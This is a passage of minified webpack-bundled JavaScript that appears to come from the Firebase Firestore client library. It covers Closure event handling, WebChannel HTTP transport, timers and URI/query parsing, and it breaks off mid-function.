(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[888],{1294:function(e,t,n){"use strict";n.d(t,{hJ:function(){return Ll},B$:function(){return Ml},oe:function(){return $u},JU:function(){return Fl},Wu:function(){return Du},Lx:function(){return Ou},PL:function(){return qu},ad:function(){return Bl},b9:function(){return Su},cf:function(){return zu},Xo:function(){return Eu},IO:function(){return vu},TQ:function(){return Cu},e0:function(){return Au},ar:function(){return bu},qs:function(){return Wu}});var r,i,s,a,o,l,u,c=n(5816),h=n(740),d=n(3333),f=n(4444),p="undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:void 0!==n.g?n.g:"undefined"!=typeof self?self:{},m={},g=g||{},y=p||self;function v(){}function w(e){var t=typeof e;return"array"==(t="object"!=t?t:e?Array.isArray(e)?"array":t:"null")||"object"==t&&"number"==typeof e.length}function b(e){var t=typeof e;return"object"==t&&null!=e||"function"==t}function _(e,t,n){return e.call.apply(e.bind,arguments)}function I(e,t,n){if(!e)throw Error();if(2<arguments.length){var r=Array.prototype.slice.call(arguments,2);return function(){var n=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(n,r),e.apply(t,n)}}return function(){return e.apply(t,arguments)}}function E(e,t,n){return(E=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?_:I).apply(null,arguments)}function T(e,t){var n=Array.prototype.slice.call(arguments,1);return function(){var t=n.slice();return t.push.apply(t,arguments),e.apply(this,t)}}function S(e,t){function n(){}n.prototype=t.prototype,e.X=t.prototype,e.prototype=new n,e.prototype.constructor=e,e.Wb=function(e,n,r){for(var i=Array(arguments.length-2),s=2;s<arguments.length;s++)i[s-2]=arguments[s];return t.prototype[n].apply(e,i)}}function k(){this.s=this.s,this.o=this.o}k.prototype.s=!1,k.prototype.na=function(){this.s||(this.s=!0,this.M())},k.prototype.M=function(){if(this.o)for(;this.o.length;)this.o.shift()()};let A=Array.prototype.indexOf?function(e,t){return Array.prototype.indexOf.call(e,t,void 0)}:function(e,t){if("string"==typeof e)return"string"!=typeof t||1!=t.length?-1:e.indexOf(t,0);for(let n=0;n<e.length;n++)if(n in e&&e[n]===t)return n;return-1};function C(e){let t=e.length;if(0<t){let n=Array(t);for(let r=0;r<t;r++)n[r]=e[r];return n}return[]}function N(e,t){for(let t=1;t<arguments.length;t++){let n=arguments[t];if(w(n)){let t=e.length||0,r=n.length||0;e.length=t+r;for(let i=0;i<r;i++)e[t+i]=n[i]}else e.push(n)}}function O(e,t){this.type=e,this.g=this.target=t,this.defaultPrevented=!1}O.prototype.h=function(){this.defaultPrevented=!0};var D=function(){if(!y.addEventListener||!Object.defineProperty)return!1;var e=!1,t=Object.defineProperty({},"passive",{get:function(){e=!0}});try{y.addEventListener("test",v,t),y.removeEventListener("test",v,t)}catch(e){}return e}();function R(e){return/^[\s\xa0]*$/.test(e)}var x=String.prototype.trim?function(e){return e.trim()}:function(e){return/^[\s\xa0]*([\s\S]*?)[\s\xa0]*$/.exec(e)[1]};function P(e,t){return e<t?-1:e>t?1:0}function L(){var e=y.navigator;return e&&(e=e.userAgent)?e:""}function M(e){return-1!=L().indexOf(e)}function F(e){return F[" "](e),e}F[" "]=v;var U=M("Opera"),V=M("Trident")||M("MSIE"),j=M("Edge"),B=j||V,q=M("Gecko")&&!(-1!=L().toLowerCase().indexOf("webkit")&&!M("Edge"))&&!(M("Trident")||M("MSIE"))&&!M("Edge"),$=-1!=L().toLowerCase().indexOf("webkit")&&!M("Edge");function z(){var e=y.document;return e?e.documentMode:void 0}e:{var G,K="",H=(G=L(),q?/rv:([^\);]+)(\)|;)/.exec(G):j?/Edge\/([\d\.]+)/.exec(G):V?/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(G):$?/WebKit\/(\S+)/.exec(G):U?/(?:Version)[ \/]?(\S+)/.exec(G):void 0);if(H&&(K=H?H[1]:""),V){var W=z();if(null!=W&&W>parseFloat(K)){i=String(W);break e}}i=K}var Q={},J=y.document&&V&&(z()||parseInt(i,10))||void 0;function X(e,t){if(O.call(this,e?e.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,e){var n=this.type=e.type,r=e.changedTouches&&e.changedTouches.length?e.changedTouches[0]:null;if(this.target=e.target||e.srcElement,this.g=t,t=e.relatedTarget){if(q){e:{try{F(t.nodeName);var i=!0;break e}catch(e){}i=!1}i||(t=null)}}else"mouseover"==n?t=e.fromElement:"mouseout"==n&&(t=e.toElement);this.relatedTarget=t,r?(this.clientX=void 0!==r.clientX?r.clientX:r.pageX,this.clientY=void 0!==r.clientY?r.clientY:r.pageY,this.screenX=r.screenX||0,this.screenY=r.screenY||0):(this.clientX=void 0!==e.clientX?e.clientX:e.pageX,this.clientY=void 0!==e.clientY?e.clientY:e.pageY,this.screenX=e.screenX||0,this.screenY=e.screenY||0),this.button=e.button,this.key=e.key||"",this.ctrlKey=e.ctrlKey,this.altKey=e.altKey,this.shiftKey=e.shiftKey,this.metaKey=e.metaKey,this.pointerId=e.pointerId||0,this.pointerType="string"==typeof e.pointerType?e.pointerType:Y[e.pointerType]||"",this.state=e.state,this.i=e,e.defaultPrevented&&X.X.h.call(this)}}S(X,O);var Y={2:"touch",3:"pen",4:"mouse"};X.prototype.h=function(){X.X.h.call(this);var e=this.i;e.preventDefault?e.preventDefault():e.returnValue=!1};var Z="closure_listenable_"+(1e6*Math.random()|0),ee=0;function te(e,t,n,r,i){this.listener=e,this.proxy=null,this.src=t,this.type=n,this.capture=!!r,this.ha=i,this.key=++ee,this.ba=this.ea=!1}function ne(e){e.ba=!0,e.listener=null,e.proxy=null,e.src=null,e.ha=null}function re(e,t,n){for(let r in e)t.call(n,e[r],r,e)}function ie(e){let t={};for(let n in e)t[n]=e[n];return t}let se="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function ae(e,t){let n,r;for(let t=1;t<arguments.length;t++){for(n in r=arguments[t])e[n]=r[n];for(let t=0;t<se.length;t++)n=se[t],Object.prototype.hasOwnProperty.call(r,n)&&(e[n]=r[n])}}function oe(e){this.src=e,this.g={},this.h=0}function le(e,t){var n=t.type;if(n in e.g){var r,i=e.g[n],s=A(i,t);(r=0<=s)&&Array.prototype.splice.call(i,s,1),r&&(ne(t),0==e.g[n].length&&(delete e.g[n],e.h--))}}function ue(e,t,n,r){for(var i=0;i<e.length;++i){var s=e[i];if(!s.ba&&s.listener==t&&!!n==s.capture&&s.ha==r)return i}return-1}oe.prototype.add=function(e,t,n,r,i){var s=e.toString();(e=this.g[s])||(e=this.g[s]=[],this.h++);var a=ue(e,t,r,i);return-1<a?(t=e[a],n||(t.ea=!1)):((t=new te(t,this.src,s,!!r,i)).ea=n,e.push(t)),t};var ce="closure_lm_"+(1e6*Math.random()|0),he={};function de(e,t,n,r,i,s){if(!t)throw Error("Invalid event type");var a=b(i)?!!i.capture:!!i,o=ge(e);if(o||(e[ce]=o=new oe(e)),(n=o.add(t,n,r,a,s)).proxy)return n;if(r=function e(t){return me.call(e.src,e.listener,t)},n.proxy=r,r.src=e,r.listener=n,e.addEventListener)D||(i=a),void 0===i&&(i=!1),e.addEventListener(t.toString(),r,i);else if(e.attachEvent)e.attachEvent(pe(t.toString()),r);else{if(!e.addListener||!e.removeListener)throw Error("addEventListener and attachEvent are unavailable.");e.addListener(r)}return n}function fe(e){if("number"!=typeof e&&e&&!e.ba){var t=e.src;if(t&&t[Z])le(t.i,e);else{var n=e.type,r=e.proxy;t.removeEventListener?t.removeEventListener(n,r,e.capture):t.detachEvent?t.detachEvent(pe(n),r):t.addListener&&t.removeListener&&t.removeListener(r),(n=ge(t))?(le(n,e),0==n.h&&(n.src=null,t[ce]=null)):ne(e)}}}function pe(e){return e in he?he[e]:he[e]="on"+e}function me(e,t){if(e.ba)e=!0;else{t=new X(t,this);var n=e.listener,r=e.ha||e.src;e.ea&&fe(e),e=n.call(r,t)}return e}function ge(e){return(e=e[ce])instanceof oe?e:null}var ye="__closure_events_fn_"+(1e9*Math.random()>>>0);function ve(e){return"function"==typeof e?e:(e[ye]||(e[ye]=function(t){return e.handleEvent(t)}),e[ye])}function we(){k.call(this),this.i=new oe(this),this.P=this,this.I=null}function be(e,t){var n,r=e.I;if(r)for(n=[];r;r=r.I)n.push(r);if(e=e.P,r=t.type||t,"string"==typeof t)t=new O(t,e);else if(t instanceof O)t.target=t.target||e;else{var i=t;ae(t=new O(r,e),i)}if(i=!0,n)for(var s=n.length-1;0<=s;s--){var a=t.g=n[s];i=_e(a,r,!0,t)&&i}if(i=_e(a=t.g=e,r,!0,t)&&i,i=_e(a,r,!1,t)&&i,n)for(s=0;s<n.length;s++)i=_e(a=t.g=n[s],r,!1,t)&&i}function _e(e,t,n,r){if(!(t=e.i.g[String(t)]))return!0;t=t.concat();for(var i=!0,s=0;s<t.length;++s){var a=t[s];if(a&&!a.ba&&a.capture==n){var o=a.listener,l=a.ha||a.src;a.ea&&le(e.i,a),i=!1!==o.call(l,r)&&i}}return i&&!r.defaultPrevented}S(we,k),we.prototype[Z]=!0,we.prototype.removeEventListener=function(e,t,n,r){!function e(t,n,r,i,s){if(Array.isArray(n))for(var a=0;a<n.length;a++)e(t,n[a],r,i,s);else i=b(i)?!!i.capture:!!i,r=ve(r),t&&t[Z]?(t=t.i,(n=String(n).toString())in t.g&&-1<(r=ue(a=t.g[n],r,i,s))&&(ne(a[r]),Array.prototype.splice.call(a,r,1),0==a.length&&(delete t.g[n],t.h--))):t&&(t=ge(t))&&(n=t.g[n.toString()],t=-1,n&&(t=ue(n,r,i,s)),(r=-1<t?n[t]:null)&&fe(r))}(this,e,t,n,r)},we.prototype.M=function(){if(we.X.M.call(this),this.i){var e,t=this.i;for(e in t.g){for(var n=t.g[e],r=0;r<n.length;r++)ne(n[r]);delete t.g[e],t.h--}}this.I=null},we.prototype.N=function(e,t,n,r){return this.i.add(String(e),t,!1,n,r)},we.prototype.O=function(e,t,n,r){return this.i.add(String(e),t,!0,n,r)};var Ie=y.JSON.stringify,Ee=new class{constructor(e,t){this.i=e,this.j=t,this.h=0,this.g=null}get(){let e;return 0<this.h?(this.h--,e=this.g,this.g=e.next,e.next=null):e=this.i(),e}}((()=>new Te),(e=>e.reset()));class Te{constructor(){this.next=this.g=this.h=null}set(e,t){this.h=e,this.g=t,this.next=null}reset(){this.next=this.g=this.h=null}}function Se(e,t){var n;s||(n=y.Promise.resolve(void 0),s=function(){n.then(Ce)}),ke||(s(),ke=!0),Ae.add(e,t)}var ke=!1,Ae=new class{constructor(){this.h=this.g=null}add(e,t){let n=Ee.get();n.set(e,t),this.h?this.h.next=n:this.g=n,this.h=n}};function Ce(){let e;for(;e=null,(t=Ae).g&&(e=t.g,t.g=t.g.next,t.g||(t.h=null),e.next=null),n=e;){try{n.h.call(n.g)}catch(e){!function(e){y.setTimeout((()=>{throw e}),0)}(e)}var t,n,r=Ee;r.j(n),100>r.h&&(r.h++,n.next=r.g,r.g=n)}ke=!1}function Ne(e,t){we.call(this),this.h=e||1,this.g=t||y,this.j=E(this.lb,this),this.l=Date.now()}function Oe(e){e.ca=!1,e.R&&(e.g.clearTimeout(e.R),e.R=null)}function De(e,t,n){if("function"==typeof e)n&&(e=E(e,n));else{if(!e||"function"!=typeof e.handleEvent)throw Error("Invalid listener argument");e=E(e.handleEvent,e)}return 2147483647<Number(t)?-1:y.setTimeout(e,t||0)}S(Ne,we),(u=Ne.prototype).ca=!1,u.R=null,u.lb=function(){if(this.ca){var e=Date.now()-this.l;0<e&&e<.8*this.h?this.R=this.g.setTimeout(this.j,this.h-e):(this.R&&(this.g.clearTimeout(this.R),this.R=null),be(this,"tick"),this.ca&&(Oe(this),this.start()))}},u.start=function(){this.ca=!0,this.R||(this.R=this.g.setTimeout(this.j,this.h),this.l=Date.now())},u.M=function(){Ne.X.M.call(this),Oe(this),delete this.g};class Re extends k{constructor(e,t){super(),this.m=e,this.j=t,this.h=null,this.i=!1,this.g=null}l(e){this.h=arguments,this.g?this.i=!0:function e(t){t.g=De((()=>{t.g=null,t.i&&(t.i=!1,e(t))}),t.j);let n=t.h;t.h=null,t.m.apply(null,n)}(this)}M(){super.M(),this.g&&(y.clearTimeout(this.g),this.g=null,this.i=!1,this.h=null)}}function xe(e){k.call(this),this.h=e,this.g={}}S(xe,k);var Pe=[];function Le(e,t,n,r){Array.isArray(n)||(n&&(Pe[0]=n.toString()),n=Pe);for(var i=0;i<n.length;i++){var s=function e(t,n,r,i,s){if(i&&i.once)return function e(t,n,r,i,s){if(Array.isArray(n)){for(var a=0;a<n.length;a++)e(t,n[a],r,i,s);return null}return r=ve(r),t&&t[Z]?t.O(n,r,b(i)?!!i.capture:!!i,s):de(t,n,r,!0,i,s)}(t,n,r,i,s);if(Array.isArray(n)){for(var a=0;a<n.length;a++)e(t,n[a],r,i,s);return null}return r=ve(r),t&&t[Z]?t.N(n,r,b(i)?!!i.capture:!!i,s):de(t,n,r,!1,i,s)}(t,n[i],r||e.handleEvent,!1,e.h||e);if(!s)break;e.g[s.key]=s}}function Me(e){re(e.g,(function(e,t){this.g.hasOwnProperty(t)&&fe(e)}),e),e.g={}}function Fe(){this.g=!0}function Ue(e,t,n,r){e.info((function(){return"XMLHTTP TEXT ("+t+"): "+function(e,t){if(!e.g)return t;if(!t)return null;try{var n=JSON.parse(t);if(n)for(e=0;e<n.length;e++)if(Array.isArray(n[e])){var r=n[e];if(!(2>r.length)){var i=r[1];if(Array.isArray(i)&&!(1>i.length)){var s=i[0];if("noop"!=s&&"stop"!=s&&"close"!=s)for(var a=1;a<i.length;a++)i[a]=""}}}return Ie(n)}catch(e){return t}}(e,n)+(r?" "+r:"")}))}xe.prototype.M=function(){xe.X.M.call(this),Me(this)},xe.prototype.handleEvent=function(){throw Error("EventHandler.handleEvent not implemented")},Fe.prototype.Aa=function(){this.g=!1},Fe.prototype.info=function(){};var Ve={},je=null;function Be(){return je=je||new we}function qe(e){O.call(this,Ve.Pa,e)}function $e(e){let t=Be();be(t,new qe(t))}function ze(e,t){O.call(this,Ve.STAT_EVENT,e),this.stat=t}function Ge(e){let t=Be();be(t,new ze(t,e))}function Ke(e,t){O.call(this,Ve.Qa,e),this.size=t}function He(e,t){if("function"!=typeof e)throw Error("Fn must not be null and must be a function");return y.setTimeout((function(){e()}),t)}Ve.Pa="serverreachability",S(qe,O),Ve.STAT_EVENT="statevent",S(ze,O),Ve.Qa="timingevent",S(Ke,O);var We={NO_ERROR:0,mb:1,zb:2,yb:3,tb:4,xb:5,Ab:6,Ma:7,TIMEOUT:8,Db:9},Qe={rb:"complete",Nb:"success",Na:"error",Ma:"abort",Fb:"ready",Gb:"readystatechange",TIMEOUT:"timeout",Bb:"incrementaldata",Eb:"progress",ub:"downloadprogress",Vb:"uploadprogress"};function Je(){}function Xe(e){return e.h||(e.h=e.i())}function Ye(){}Je.prototype.h=null;var Ze={OPEN:"a",qb:"b",Na:"c",Cb:"d"};function et(){O.call(this,"d")}function tt(){O.call(this,"c")}function nt(){}function rt(e,t,n,r){this.l=e,this.j=t,this.m=n,this.U=r||1,this.S=new xe(this),this.O=st,e=B?125:void 0,this.T=new Ne(e),this.H=null,this.i=!1,this.s=this.A=this.v=this.K=this.F=this.V=this.B=null,this.D=[],this.g=null,this.C=0,this.o=this.u=null,this.Y=-1,this.I=!1,this.N=0,this.L=null,this.$=this.J=this.Z=this.P=!1,this.h=new it}function it(){this.i=null,this.g="",this.h=!1}S(et,O),S(tt,O),S(nt,Je),nt.prototype.g=function(){return new XMLHttpRequest},nt.prototype.i=function(){return{}},a=new nt;var st=45e3,at={},ot={};function lt(e,t,n){e.K=1,e.v=kt(_t(t)),e.s=n,e.P=!0,ut(e,null)}function ut(e,t){e.F=Date.now(),dt(e),e.A=_t(e.v);var n=e.A,r=e.U;Array.isArray(r)||(r=[String(r)]),Vt(n.i,"t",r),e.C=0,n=e.l.H,e.h=new it,e.g=Un(e.l,n?t:null,!e.s),0<e.N&&(e.L=new Re(E(e.La,e,e.g),e.N)),Le(e.S,e.g,"readystatechange",e.ib),t=e.H?ie(e.H):{},e.s?(e.u||(e.u="POST"),t["Content-Type"]="application/x-www-form-urlencoded",e.g.da(e.A,e.u,e.s,t)):(e.u="GET",e.g.da(e.A,e.u,null,t)),$e(),function(e,t,n,r,i,s){e.info((function(){if(e.g)if(s)for(var a="",o=s.split("&"),l=0;l<o.length;l++){var u=o[l].split("=");if(1<u.length){var c=u[0];u=u[1];var h=c.split("_");a=2<=h.length&&"type"==h[1]?a+(c+"=")+u+"&":a+(c+"=redacted&")}}else a=null;else a=s;return"XMLHTTP REQ ("+r+") [attempt "+i+"]: "+t+"\n"+n+"\n"+a}))}(e.j,e.u,e.A,e.m,e.U,e.s)}function ct(e){return!!e.g&&"GET"==e.u&&2!=e.K&&e.l.Da}function ht(e,t,n){let r,i=!0;for(;!e.I&&e.C<n.length;){if((r=function(e,t){var n=e.C,r=t.indexOf("\n",n);return-1==r?ot:isNaN(n=Number(t.substring(n,r)))?at:(r+=1)+n>t.length?ot:(t=t.substr(r,n),e.C=r+n,t)}(e,n))==ot){4==t&&(e.o=4,Ge(14),i=!1),Ue(e.j,e.m,null,"[Incomplete Response]");break}if(r==at){e.o=4,Ge(15),Ue(e.j,e.m,n,"[Invalid Chunk]"),i=!1;break}Ue(e.j,e.m,r,null),yt(e,r)}ct(e)&&r!=ot&&r!=at&&(e.h.g="",e.C=0),4!=t||0!=n.length||e.h.h||(e.o=1,Ge(16),i=!1),e.i=e.i&&i,i?0<n.length&&!e.$&&(e.$=!0,(t=e.l).g==e&&t.$&&!t.K&&(t.j.info("Great, no buffering proxy detected. Bytes received: "+n.length),On(t),t.K=!0,Ge(11))):(Ue(e.j,e.m,n,"[Invalid Chunked Response]"),gt(e),mt(e))}function dt(e){e.V=Date.now()+e.O,ft(e,e.O)}function ft(e,t){if(null!=e.B)throw Error("WatchDog timer not null");e.B=He(E(e.gb,e),t)}function pt(e){e.B&&(y.clearTimeout(e.B),e.B=null)}function mt(e){0==e.l.G||e.I||xn(e.l,e)}function gt(e){pt(e);var t=e.L;t&&"function"==typeof t.na&&t.na(),e.L=null,Oe(e.T),Me(e.S),e.g&&(t=e.g,e.g=null,t.abort(),t.na())}function yt(e,t){try{var n=e.l;if(0!=n.G&&(n.g==e||Gt(n.h,e)))if(!e.J&&Gt(n.h,e)&&3==n.G){try{var r=n.Fa.g.parse(t)}catch(e){r=null}if(Array.isArray(r)&&3==r.length){var i=r;if(0==i[0]){e:if(!n.u){if(n.g){if(!(n.g.F+3e3<e.F))break e;Rn(n),In(n)}Nn(n),Ge(18)}}else n.Ba=i[1],0<n.Ba-n.T&&37500>i[2]&&n.L&&0==n.A&&!n.v&&(n.v=He(E(n.cb,n),6e3));if(1>=zt(n.h)&&n.ja){try{n.ja()}catch(e){}n.ja=void 0}}else Ln(n,11)}else if((e.J||n.g==e)&&Rn(n),!R(t))for(i=n.Fa.g.parse(t),t=0;t<i.length;t++){let o=i[t];if(n.T=o[0],o=o[1],2==n.G)if("c"==o[0]){n.I=o[1],n.ka=o[2];let t=o[3];null!=t&&(n.ma=t,n.j.info("VER="+n.ma));let i=o[4];null!=i&&(n.Ca=i,n.j.info("SVER="+n.Ca));let l=o[5];null!=l&&"number"==typeof l&&0<l&&(r=1.5*l,n.J=r,n.j.info("backChannelRequestTimeoutMs_="+r)),r=n;let u=e.g;if(u){let e=u.g?u.g.getResponseHeader("X-Client-Wire-Protocol"):null;if(e){var s=r.h;s.g||-1==e.indexOf("spdy")&&-1==e.indexOf("quic")&&-1==e.indexOf("h2")||(s.j=s.l,s.g=new Set,s.h&&(Kt(s,s.h),s.h=null))}if(r.D){let e=u.g?u.g.getResponseHeader("X-HTTP-Session-Id"):null;e&&(r.za=e,St(r.F,r.D,e))}}if(n.G=3,n.l&&n.l.xa(),n.$&&(n.P=Date.now()-e.F,n.j.info("Handshake RTT: "+n.P+"ms")),(r=n).sa=Fn(r,r.H?r.ka:null,r.V),e.J){Ht(r.h,e);var a=r.J;a&&e.setTimeout(a),e.B&&(pt(e),dt(e)),r.g=e}else Cn(r);0<n.i.length&&Tn(n)}else"stop"!=o[0]&&"close"!=o[0]||Ln(n,7);else 3==n.G&&("stop"==o[0]||"close"==o[0]?"stop"==o[0]?Ln(n,7):_n(n):"noop"!=o[0]&&n.l&&n.l.wa(o),n.A=0)}$e()}catch(e){}}function vt(e,t){if(e.forEach&&"function"==typeof e.forEach)e.forEach(t,void 0);else if(w(e)||"string"==typeof e)Array.prototype.forEach.call(e,t,void 0);else for(var n=function(e){if(e.oa&&"function"==typeof e.oa)return e.oa();if(!e.W||"function"!=typeof e.W){if("undefined"!=typeof Map&&e instanceof Map)return Array.from(e.keys());if(!("undefined"!=typeof Set&&e instanceof Set)){if(w(e)||"string"==typeof e){var t=[];e=e.length;for(var n=0;n<e;n++)t.push(n);return t}for(let r in t=[],n=0,e)t[n++]=r;return t}}}(e),r=function(e){if(e.W&&"function"==typeof e.W)return e.W();if("undefined"!=typeof Map&&e instanceof Map||"undefined"!=typeof Set&&e instanceof Set)return Array.from(e.values());if("string"==typeof e)return e.split("");if(w(e)){for(var t=[],n=e.length,r=0;r<n;r++)t.push(e[r]);return t}for(r in t=[],n=0,e)t[n++]=e[r];return t}(e),i=r.length,s=0;s<i;s++)t.call(void 0,r[s],n&&n[s],e)}(u=rt.prototype).setTimeout=function(e){this.O=e},u.ib=function(e){e=e.target;let t=this.L;t&&3==mn(e)?t.l():this.La(e)},u.La=function(e){try{if(e==this.g)e:{let c=mn(this.g);var t=this.g.Ea();this.g.aa();if(!(3>c)&&(3!=c||B||this.g&&(this.h.h||this.g.fa()||gn(this.g)))){this.I||4!=c||7==t||$e(),pt(this);var n=this.g.aa();this.Y=n;t:if(ct(this)){var r=gn(this.g);e="";var i=r.length,s=4==mn(this.g);if(!this.h.i){if("undefined"==typeof TextDecoder){gt(this),mt(this);var a="";break t}this.h.i=new y.TextDecoder}for(t=0;t<i;t++)this.h.h=!0,e+=this.h.i.decode(r[t],{stream:s&&t==i-1});r.splice(0,i),this.h.g+=e,this.C=0,a=this.h.g}else a=this.g.fa();if(this.i=200==n,function(e,t,n,r,i,s,a){e.info((function(){return"XMLHTTP RESP ("+r+") [ attempt "+i+"]: "+t+"\n"+n+"\n"+s+" "+a}))}(this.j,this.u,this.A,this.m,this.U,c,n),this.i){if(this.Z&&!this.J){t:{if(this.g){var o,l=this.g;if((o=l.g?l.g.getResponseHeader("X-HTTP-Initial-Response"):null)&&!R(o)){var u=o;break t}}u=null}if(!(n=u)){this.i=!1,this.o=3,Ge(12),gt(this),mt(this);break e}Ue(this.j,this.m,n,"Initial handshake response via X-HTTP-Initial-Response"),this.J=!0,yt(this,n)}this.P?(ht(this,c,a),B&&this.i&&3==c&&(Le(this.S,this.T,"tick",this.hb),this.T.start())):(Ue(this.j,this.m,a,null),yt(this,a)),4==c&&gt(this),this.i&&!this.I&&(4==c?xn(this.l,this):(this.i=!1,dt(this)))}else 400==n&&0<a.indexOf("Unknown SID")?(this.o=3,Ge(12)):(this.o=0,Ge(13)),gt(this),mt(this)}}}catch(e){}},u.hb=function(){if(this.g){var e=mn(this.g),t=this.g.fa();this.C<t.length&&(pt(this),ht(this,e,t),this.i&&4!=e&&dt(this))}},u.cancel=function(){this.I=!0,gt(this)},u.gb=function(){this.B=null;let e=Date.now();0<=e-this.V?(function(e,t){e.info((function(){return"TIMEOUT: "+t}))}(this.j,this.A),2!=this.K&&($e(),Ge(17)),gt(this),this.o=2,mt(this)):ft(this,this.V-e)};var wt=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function bt(e,t){if(this.g=this.s=this.j="",this.m=null,this.o=this.l="",this.h=!1,e instanceof bt){this.h=void 0!==t?t:e.h,It(this,e.j),this.s=e.s,this.g=e.g,Et(this,e.m),this.l=e.l,t=e.i;var n=new Lt;n.i=t.i,t.g&&(n.g=new Map(t.g),n.h=t.h),Tt(this,n),this.o=e.o}else e&&(n=String(e).match(wt))?(this.h=!!t,It(this,n[1]||"",!0),this.s=At(n[2]||""),this.g=At(n[3]||"",!0),Et(this,n[4]),this.l=At(n[5]||"",!0),Tt(this,n[6]||"",!0),this.o=At(n[7]||"")):(this.h=!!t,this.i=new Lt(null,this.h))}function _t(e){return new bt(e)}function It(e,t,n){e.j=n?At(t,!0):t,e.j&&(e.j=e.j.replace(/:$/,""))}function Et(e,t){if(t){if(isNaN(t=Number(t))||0>t)throw Error("Bad port number "+t);e.m=t}else e.m=null}function Tt(e,t,n){var r,i;t instanceof Lt?(e.i=t,r=e.i,(i=e.h)&&!r.j&&(Mt(r),r.i=null,r.g.forEach((function(e,t){var n=t.toLowerCase();t!=n&&(Ft(this,t),Vt(this,n,e))}),r)),r.j=i):(n||(t=Ct(t,xt)),e.i=new Lt(t,e.h))}function St(e,t,n){e.i.set(t,n)}function kt(e){return St(e,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),e}function At(e,t){return e?t?decodeURI(e.replace(/%25/g,"%2525")):decodeURIComponent(e):""}function Ct(e,t,n){return"string"==typeof e?(e=encodeURI(e).replace(t,Nt),n&&(e=e.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),e):null}function Nt(e){return"%"+((e=e.charCodeAt(0))>>4&15).toString(16)+(15&e).toString(16)}bt.prototype.toString=function(){var e=[],t=this.j;t&&e.push(Ct(t,Ot,!0),":");var n=this.g;return(n||"file"==t)&&(e.push("//"),(t=this.s)&&e.push(Ct(t,Ot,!0),"@"),e.push(encodeURIComponent(String(n)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),null!=(n=this.m)&&e.push(":",String(n))),(n=this.l)&&(this.g&&"/"!=n.charAt(0)&&e.push("/"),e.push(Ct(n,"/"==n.charAt(0)?Rt:Dt,!0))),(n=this.i.toString())&&e.push("?",n),(n=this.o)&&e.push("#",Ct(n,Pt)),e.join("")};var Ot=/[#\/\?@]/g,Dt=/[#\?:]/g,Rt=/[#\?]/g,xt=/[#\?@]/g,Pt=/#/g;function Lt(e,t){this.h=this.g=null,this.i=e||null,this.j=!!t}function Mt(e){e.g||(e.g=new Map,e.h=0,e.i&&function(e,t){if(e){e=e.split("&");for(var n=0;n<e.length;n++){var r=e[n].indexOf("="),i=null;if(0<=r){var s=e[n].substring(0,r);i=e[n].substring(r+1)}else s=e[n];t(s,i?decodeURIComponent(i.replace(/\+/g," ")):"")}}}(e.i,(function(t,n){e.add(decodeURIComponent(t.replace(/\+/g," ")),n)})))}function Ft(e,t){Mt(e),t=jt(e,t),e.g.has(t)&&(e.i=null,e.h-=e.g.get(t).length,e.g.delete(t))}function Ut(e,t){return Mt(e),t=jt(e,t),e.g.has(t)}function Vt(e,t,n){Ft(e,t),0<n.length&&(e.i=null,e.g.set(jt(e,t),C(n)),e.h+=n.length)}function jt(e,t){return t=String(t),e.j&&(t=t.toLowerCase()),t}(u=Lt.prototype).add=function(e,t){Mt(this),this.i=null,e=jt(this,e);var n=this.g.get(e);return n||this.g.set(e,n=[]),n.push(t),this.h+=1,this},u.forEach=function(e,t){Mt(this),this.g.forEach((function(n,r){n.forEach((function(n){e.call(t,n,r,this)}),this)}),this)},u.oa=function(){Mt(this);let e=Array.from(this.g.values()),t=Array.from(this.g.keys()),n=[];for(let r=0;r<t.length;r++){let i=e[r];for(let e=0;e<i.length;e++)n.push(t[r])}return n},u.W=function(e){Mt(this);let t=[];if("string"==typeof e)Ut(this,e)&&(t=t.concat(this.g.get(jt(this,e))));else{e=Array.from(this.g.values());for(let n=0;n<e.length;n++)t=t.concat(e[n])}return t},u.set=function(e,t){return Mt(this),this.i=null,Ut(this,e=jt(this,e))&&(this.h-=this.g.get(e).length),this.g.set(e,[t]),this.h+=1,this},u.get=function(e,t){return e&&0<(e=this.W(e)).length?String(e[0]):t},u.toString=function(){if(this.i)return this.i;if(!this.g)return"";let e=[],t=Array.from(this.g.keys());for(var n=0;n<t.length;n++){var r=t[n];let s=encodeURIComponent(String(r)),a=this.W(r);for(r=0;r<a.length;r++){var i=s;""!==a[r]&&(i+="="+encodeURIComponent(String(a[r]))),e.push(i)}}return this.i=e.join("&")};function Bt(e){this.l=e||qt,e=y.PerformanceNavigationTiming?0<(e=y.performance.getEntriesByType("navigation")).length&&("hq"==e[0].nextHopProtocol||"h2"==e[0].nextHopProtocol):!!(y.g&&y.g.Ga&&y.g.Ga()&&y.g.Ga().$b),this.j=e?this.l:1,this.g=null,1<this.j&&(this.g=new Set),this.h=null,this.i=[]}var qt=10;function $t(e){return!!e.h||!!e.g&&e.g.size>=e.j}function zt(e){return e.h?1:e.g?e.g.size:0}function Gt(e,t){return e.h?e.h==t:!!e.g&&e.g.has(t)}function Kt(e,t){e.g?e.g.add(t):e.h=t}function Ht(e,t){e.h&&e.h==t?e.h=null:e.g&&e.g.has(t)&&e.g.delete(t)}function Wt(e){if(null!=e.h)return e.i.concat(e.h.D);if(null!=e.g&&0!==e.g.size){let t=e.i;for(let n of e.g.values())t=t.concat(n.D);return t}return C(e.i)}function Qt(){}function Jt(){this.g=new Qt}function Xt(e,t,n,r,i){try{t.onload=null,t.onerror=null,t.onabort=null,t.ontimeout=null,i(r)}catch(e){}}function Yt(e){this.l=e.ac||null,this.j=e.jb||!1}function 